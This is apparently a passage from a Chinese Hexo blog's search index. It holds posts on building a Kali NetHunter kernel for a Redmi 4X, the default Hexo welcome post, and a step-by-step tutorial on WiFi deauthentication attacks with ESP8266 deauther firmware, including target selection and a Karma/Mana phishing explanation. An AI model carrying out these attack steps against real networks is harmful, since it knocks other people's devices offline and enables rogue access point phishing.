<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入到<span class="string">&quot;Device Drivers&quot;</span> -&gt; <span class="string">&quot;HID support&quot;</span> 勾选：  </span><br><span class="line"><span class="string">&quot;Battery level reporting for HID devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;/dev/hidraw raw HID device support&quot;</span>  </span><br><span class="line"><span class="string">&quot;User-space I/O driver support for HID subsystem&quot;</span>  </span><br><span class="line"><span class="string">&quot;Generic HID driver&quot;</span>  </span><br><span class="line">勾选<span class="string">&quot;Special HID drivers&quot;</span>  <span class="string">&quot;USB HID support&quot;</span>  <span class="string">&quot;HID over I2C transport layer&quot;</span>  内所有选项</span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/hid_support.png" alt="HID_support" title="HID_support"><br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/special_hid.png" alt="Special_HID" title="Special_HID"><br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_hid.png" alt="USB_HID" title="USB_HID">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/i2c_hid.png" alt="I2C_HID" title="I2C_HID"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Device Drivers&quot;</span> -&gt; <span class="string">&quot;USB support&quot;</span>  勾选：  </span><br><span class="line"><span class="string">&quot;Support for Host-side USB&quot;</span>  </span><br><span class="line"><span class="string">&quot;OTG support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Modem (CDC ACM) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Wireless Device Management support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Mass Storage support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Serial Converter support&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;USB Serial Converter support&quot;</span> 中勾选：  </span><br><span class="line"><span class="string">&quot;USB Serial Console device support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Generic Serial Drive&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Serial Simple Drive&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Winchiphead CH341 Single Port Serial Driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB CP210x family of UART Bridge Controllers&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB FTDI Single Port Serial Driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Prolific 2303 Single Port Serial Driver&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;USB Gadget Support&quot;</span>中勾选：  </span><br><span class="line"><span class="string">&quot;USB functions configurable through configfs&quot;</span>  </span><br><span class="line"><span class="string">&quot;Generic serial bulk in/out&quot;</span>  </span><br><span class="line"><span class="string">&quot;Abstract Control Model (CDC ACM)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Object Exchange Model (CDC OBEX)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Network Control Model (CDC NCM)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ethernet Control Model (CDC ECM)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ethernet Control Model (CDC ECM) subset&quot;</span>  </span><br><span class="line"><span class="string">&quot;QCRNDIS&quot;</span>  </span><br><span class="line"><span class="string">&quot;RNDIS&quot;</span>  </span><br><span class="line"><span class="string">&quot;RMNET_BAM&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ethernet Emulation Model (EEM)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Mass storage&quot;</span>  </span><br><span class="line"><span class="string">&quot;Function filesystem (FunctionFS)&quot;</span>  </span><br><span class="line"><span class="string">&quot;MTP gadget&quot;</span>  </span><br><span class="line"><span class="string">&quot;PTP gadget&quot;</span>  </span><br><span class="line"><span class="string">&quot;Accessory gadget&quot;</span>  </span><br><span class="line"><span class="string">&quot;Audio Source gadget&quot;</span>  </span><br><span class="line"><span class="string">&quot;Uevent notification of Gadget state&quot;</span>  </span><br><span class="line"><span class="string">&quot;MIDI function&quot;</span>  </span><br><span class="line"><span class="string">&quot;HID function&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Diag function&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Serial Character function&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB CCID function&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB QDSS function&quot;</span>  </span><br><span class="line">接着返回主菜单，退出并保存配置</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_support.png" alt="USB_support" title="USB_support">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_serial.png" alt="USB_Serial" title="USB_Serial">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_gadget.png" alt="USB_Gadget" title="USB_Gadget"></p>
<h4 id="保存配置"><a href="#保存配置" class="headerlink" title="保存配置"></a>保存配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> savedefconfig</span><br></pre></td></tr></table></figure>



<h4 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> 2&gt;&amp;1 | <span class="built_in">tee</span> kernel.log</span><br></pre></td></tr></table></figure>
<h4 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> INSTALL_MOD_PATH=<span class="string">&quot;.&quot;</span> INSTALL_MOD_STRIP=1 modules_install</span><br></pre></td></tr></table></figure>


<h2 id="0x07-构建NetHunter-Kernel-Installer内核包"><a href="#0x07-构建NetHunter-Kernel-Installer内核包" class="headerlink" title="0x07 构建NetHunter-Kernel-Installer内核包"></a>0x07 构建NetHunter-Kernel-Installer内核包</h2><h4 id="下载Kali官方构建脚本"><a href="#下载Kali官方构建脚本" class="headerlink" title="下载Kali官方构建脚本"></a>下载Kali官方构建脚本</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project /root/kali-nethunter-project --depth=1</span><br></pre></td></tr></table></figure>
<h4 id="编辑机型列表"><a href="#编辑机型列表" class="headerlink" title="编辑机型列表"></a>编辑机型列表</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/kali-nethunter-project/nethunter-installer/devices/  </span><br><span class="line"><span class="built_in">touch</span> /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg  </span><br><span class="line">vim /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg  </span><br></pre></td></tr></table></figure>
<p>按照<a href="https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-devices#how-to-add-a-newunsupported-device">官方教程</a>，添加以下内容并保存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Xiaomi Redmi4X for crDroid Android 11  </span></span><br><span class="line">[santoni]  </span><br><span class="line">author = <span class="string">&quot;DroidKali&quot;</span>  </span><br><span class="line"><span class="built_in">arch</span> = arm64  </span><br><span class="line">version = <span class="string">&quot;v1.0&quot;</span>  </span><br><span class="line">flasher = anykernel  </span><br><span class="line">modules = 1  </span><br><span class="line">slot_device = 0  </span><br><span class="line">block = /dev/block/bootdevice/by-name/boot  </span><br><span class="line">devicenames = santoni,Redmi4x  </span><br></pre></td></tr></table></figure>
<h4 id="创建机型对应的文件夹"><a href="#创建机型对应的文件夹" class="headerlink" title="创建机型对应的文件夹"></a>创建机型对应的文件夹</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules  </span><br></pre></td></tr></table></figure>
<h4 id="复制所需要的文件"><a href="#复制所需要的文件" class="headerlink" title="复制所需要的文件"></a>复制所需要的文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> out/arch/arm64/boot/Image.gz-dtb /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni  </span><br><span class="line"><span class="built_in">rm</span> -rf out/lib/modules/<span class="variable">$&#123;make kernelversion&#125;</span>-NetHunter/source  </span><br><span class="line"><span class="built_in">rm</span> -rf out/lib/modules/<span class="variable">$&#123;make kernelversion&#125;</span>-NetHunter/build  </span><br><span class="line"><span class="built_in">cp</span> -r out/lib/modules/<span class="variable">$&#123;make kernelversion&#125;</span>-NetHunter /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules/  </span><br></pre></td></tr></table></figure>
<h4 id="生成NetHunter-Kernnel-Installer安装包"><a href="#生成NetHunter-Kernnel-Installer安装包" class="headerlink" title="生成NetHunter-Kernnel-Installer安装包"></a>生成NetHunter-Kernnel-Installer安装包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/kali-nethunter-project/nethunter-installer/  </span><br><span class="line">python3 build.py -d santoni --eleven --kernel</span><br></pre></td></tr></table></figure>

<h2 id="0x08-下载ADB-FASTBOOT工具包"><a href="#0x08-下载ADB-FASTBOOT工具包" class="headerlink" title="0x08 下载ADB-FASTBOOT工具包"></a>0x08 下载ADB-FASTBOOT工具包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip</span><br><span class="line">unzip paltform-tools-latest-linux.zip -d /usr/share/</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#x27;</span><span class="string">&#x27;export PATH=&quot;/usr/share/platform-tools:$PATH&quot;&#x27;</span><span class="string">&#x27;&#x27;</span> &gt; /root/.zshrc</span><br><span class="line"><span class="built_in">source</span> /root/.zshrc</span><br><span class="line"><span class="built_in">rm</span> -rf platform-tools-latest-linux.zip</span><br></pre></td></tr></table></figure>

<h2 id="0x09-刷入内核安装包"><a href="#0x09-刷入内核安装包" class="headerlink" title="0x09 刷入内核安装包"></a>0x09 刷入内核安装包</h2><h4 id="重启到Recovery模式"><a href="#重启到Recovery模式" class="headerlink" title="重启到Recovery模式"></a>重启到Recovery模式</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb reboot recovery</span><br></pre></td></tr></table></figure>
<h4 id="刷入内核刷机包"><a href="#刷入内核刷机包" class="headerlink" title="刷入内核刷机包"></a>刷入内核刷机包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb sideload kernel-nethunter-eleven-santoni-20210905_111235.zip</span><br></pre></td></tr></table></figure>

<h2 id="0x10-相关链接"><a href="#0x10-相关链接" class="headerlink" title="0x10 相关链接"></a>0x10 相关链接</h2><p><a href="https://www.kali.org/docs/nethunter/">Kali NetHunter | Kali Linux Documentation</a>  </p>
<p><a href="https://gitlab.com/kalilinux/nethunter/">NetHunter gitlab repository</a>  </p>
<p><a href="https://zhuanlan.zhihu.com/p/24946336">“黑客手机”免费送-知乎专栏</a>  </p>
<p><a href="https://www.vuln.cn/7086">跟我把Kali NetHunter编译至任意手机</a>  </p>
<p><a href="https://forums.kali.org/showthread.php?44899-Building-a-kernel-for-the-Razor-Phone-2-Live-feed">Building a Kernel for the Razor Phone 2 - Live feed</a>  </p>
<p><a href="https://github.com/nathanchance/android-kernel-clang">Information on Compiling Android Kernels with Clang</a>  </p>
<p><a href="https://www.akr-developers.com/d/129">[内核向] - 交叉编译器的选择</a></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>NetHunter</tag>
        <tag>Android</tag>
        <tag>Kernel</tag>
        <tag>内核编译</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2018/12/04/hello-world.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>wifi-deauth-attack初探</title>
    <url>/2018/12/06/wifi-deauth-attack.html</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段时间玩过一阵子ESP8266 WiFi Deauth攻击，闲的无聊来水一波文章！</p>
<span id="more"></span>
<h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p>我们所使用的802.11 WiFi协议包含了一个Deauthentication(解除身份验证)的特性，其作用是为了将用户从无线网络中分离。而黑客们正是利用了WiFi的这个特性，使得黑客可以随时使用无线AP的伪造源地址，向无线AP设备发送一个或多个Deauthentication攻击数据包，从而使得合法客户端设备从无线AP设备上掉线。简单来说就是黑客可以随时让你的无线终端设备(例如智能手机，平板，笔记本)等设备从WiFi中掉线然后再也无法连接，除非黑客停止攻击。</p>
<p>该协议不需要对Deauthentication攻击框架进行加密，甚至是建立会话。该问题在<a href="https://www.networkworld.com/article/2312251/network-security/how-802-11w-will-improve-wireless-security.html">802.11w-2009</a>中有提及解决，但是几乎所有的无线AP设备厂商默认都禁用了这个属性，所以直到今天这个漏洞仍影响着全球近九成以上的无线AP设备。</p>
<h1 id="0x02-材料准备"><a href="#0x02-材料准备" class="headerlink" title="0x02 材料准备"></a>0x02 材料准备</h1><blockquote>
<p>·ESP8266 无线模块一块 (某宝自行搜索)<br>·一条Micro USB数据线 (有条件的话用USB转TTL也行)<br>·电脑一台 </p>
</blockquote>
<h1 id="0x03-环境准备"><a href="#0x03-环境准备" class="headerlink" title="0x03 环境准备"></a>0x03 环境准备</h1><blockquote>
<p>·Arduino IDE <a href="https://www.arduino.cc/en/Main/Software?setlang=cn">传送门</a><br>·NodeMcu Flasher <a href="https://github.com/nodemcu/nodemcu-flasher">传送门</a></p>
</blockquote>
<h1 id="0x03-刷入固件"><a href="#0x03-刷入固件" class="headerlink" title="0x03 刷入固件"></a>0x03 刷入固件</h1><p>首先把我们的ESP8266连接到电脑上，安装对应的驱动</p>
<blockquote>
<p>·CH340串口驱动 <a href="http://www.wch.cn/download/CH341SER_ZIP.html">传送门</a><br>·CP2102串口驱动 <a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers">传送门</a></p>
</blockquote>
<p>接着我们去下载ESP8266专用的WiFi Deauth攻击固件，固件地址:</p>
<blockquote>
<p><a href="https://github.com/spacehuhn/esp8266_deauther/releases">https://github.com/spacehuhn/esp8266_deauther/releases</a></p>
</blockquote>
<p>这里需要注意的是固件的选择要根据你的模块Flash大小来选择，ESP-12的Flash大小为4MB，ESP-07的为1MB,ESP-01的为512KB&#x2F;1MB。详细说明可以参考<a href="https://github.com/spacehuhn/esp8266_deauther/wiki/Installation#flash-size">官方wiki</a><br>接下来我们开始刷入固件，打开NodeMcu Flasher，点击Config选项卡，选择你的固件，接着点击Advanced选项卡，在Baudrate(波特率)处选择115200，Flash size根据你的板子Flash大小来选择，我这里是ESP-12所以选择4MB，Flash speed选择80MHz，SPI mode选择DIO,最后我们点击Operation选项卡，在COM port处选择你的板子的端口，可以在windows的设备管理那里看到，然后点击Flash(F)按钮，接着就是等待固件烧录完成了。固件烧录完成后NodeMcu Flasher左下角的NODEMCU TEAM图标会变为绿色。</p>
<h1 id="0x04-攻击实战"><a href="#0x04-攻击实战" class="headerlink" title="0x04 攻击实战"></a>0x04 攻击实战</h1><p>接着我们打开手机WiFi设置，能搜索到一个SSID名为<em><strong>pwned</strong></em>的WiFi，这个就是我们烧录好固件之后生成的，密码为<em><strong>deauther</strong></em>，连接上去。接着我们打开手机浏览器，在地址栏输入<em><strong><a href="http://192.168.4.1/">http://192.168.4.1</a></strong></em>进入deauther的后台管理界面，如图:<img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/esp8266-scan.png" alt="esp8266-scan">由于最新<em><strong>v2.1.0</strong></em>版的固件自带了一个开机自动扫描AP的脚本，所以就不需要我们连上后再手动扫描了，当然如果你想得到更准确的结果的话你也可以重新扫描。扫描周围的无线热点后，我们选择一个目标开始攻击，这里我选择的FAST_4E14这个热点，然后选择攻击界面，如图:<img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/esp8266-attack.png" alt="esp8266-attack">选择Deauth攻击，接着刷新界面就能看到攻击效果了<img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/esp8266-attacking.png" alt="esp8266-attacking">此时被攻击的无线AP上所有已连接的设备会全部掉线直至我们停止攻击。</p>
<h1 id="0x05-安全建议"><a href="#0x05-安全建议" class="headerlink" title="0x05 安全建议"></a>0x05 安全建议</h1><p>由于WiFi Deauth攻击是802.11协议上的一个缺陷造成的，所以目前并没有什么有效的防御措施，只能等无线联盟更新协议来弥补这个缺憾。个人的话尽量按照以下几点来做吧</p>
<blockquote>
<p>·路由设置白名单或MAC地址绑定<br>·开启访客WiFi<br>·隐藏SSID<br>·不用WiFi时尽量关闭路由</p>
</blockquote>
<h1 id="0x06-补充说明"><a href="#0x06-补充说明" class="headerlink" title="0x06 补充说明"></a>0x06 补充说明</h1><p>可能大家对ESP8266 Deauther的最后一个攻击模式不太清楚，这里引用天马安全团队杨大佬的文章来解释一下:我们所使用的无线客户端设备在连接无线AP时会采用两种扫描方法，主动扫描和被动扫描。在主动扫描中，客户端发送Probe Request,接收由AP发回的Probe Response。在被动扫描中，客户端在每个频道监听AP周期性发送的Beacon无线数据帧。之后是认证(Authentication)和连接(Association)过程。<br>说白了就是我们所使用的无线客户端(例如手机，平板，笔记本等设备)在连接WiFi的时候也会向外广播一个无线数据帧，这个无线数据帧就是<strong>Probe Request</strong>帧,这个数据帧里面包含了我们的无线设备曾经连过哪些WiFi，它们的SSID是什么，MAC地址等等，而无线AP接收到这个数据帧之后也会进行回复响应，回复给无线客户端设备另外一个数据帧-<strong>Probe Response</strong>帧，这样就可以做到无线客户端设备和无线AP设备之间的快速连接。<br>但是这个特性也可以被黑客给利用，黑客可以监听空气中的无线数据包，分析里面的内容，可以抓到这个Probe Request帧，得到里面包含的无线客户端设备曾经连过的WiFi热点的SSID,MAC地址，从而伪造一个同名同MAC地址的无线接入点来实施钓鱼攻击。这就是后来的Karma和Mana攻击的原理！具体的内容可以看看FreeBuf上的相关文章，我这个菜鸡就不在这里班门弄斧了！</p>
<blockquote>
<p><a href="https://www.freebuf.com/articles/wireless/145259.html">聊聊WiFi Hacks：为何你的Karma攻击不好使了</a></p>
<p><a href="https://www.freebuf.com/column/144882.html">WiFi Pineapple的Karma攻击与原理探究</a></p>
<p><a href="https://www.freebuf.com/articles/77055.html">WiFi Pineapple的Karma攻击与原理探究</a></p>
<p><a href="https://www.freebuf.com/articles/wireless/44378.html">主动触发被动模式从而挟持无线客户端 – Passive Karma Attack</a></p>
</blockquote>
]]></content>
      <categories>
        <category>wireless-hacking</category>
      </categories>
      <tags>
        <tag>esp8266</tag>
        <tag>wifi</tag>
        <tag>wireless</tag>
      </tags>
  </entry>
</search>
